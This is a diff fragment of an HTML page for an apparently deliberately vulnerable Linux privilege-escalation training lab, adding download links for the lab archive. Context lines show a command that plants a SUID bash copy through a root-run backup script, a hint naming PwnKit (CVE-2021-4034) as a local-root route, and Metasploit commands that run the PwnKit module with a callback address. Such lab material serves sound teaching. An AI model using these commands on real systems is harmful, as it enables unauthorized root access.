@@ -232,7 +232,7 @@ echo 'cp /bin/bash /tmp/rb && chmod u+s /tmp/rb' >> /opt/scripts/backup.sh     #
   <details><summary>🔴 pkexec / PwnKit — <code>enum/suid.txt</code> + <code>enum/system.txt</code></summary><code class="pl">pkexec SUID on Ubuntu 21.10   →   CVE-2021-4034 (PwnKit) local root  (public PoC, or the MSF module)</code></details>
   <details><summary>🧰 Metasploit — Meterpreter session → root</summary><code class="pl">use post/multi/recon/local_exploit_suggester ; set SESSION N ; run
 use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec ; set SESSION N ; set LHOST &lt;you&gt; ; run   # → root</code></details>
-  <p class="muted">Full answers → <a href="/privesc/solution.md">solution.md</a> · reference <a href="https://gtfobins.github.io">GTFOBins</a></p></div>
+  <p class="muted">📦 Download the lab (enum + README + solution) → <a href="/privesc/privesc_lab.tar.gz" download>tar.gz</a> · <a href="/privesc/privesc_lab.zip" download>zip</a> &nbsp;|&nbsp; full answers → <a href="/privesc/solution.md">solution.md</a> · <a href="https://gtfobins.github.io">GTFOBins</a></p></div>
 
 </div>
 <footer>⚠️ <b>Intentionally vulnerable — training only.</b> Run locally / isolated lab; never expose it.</footer>
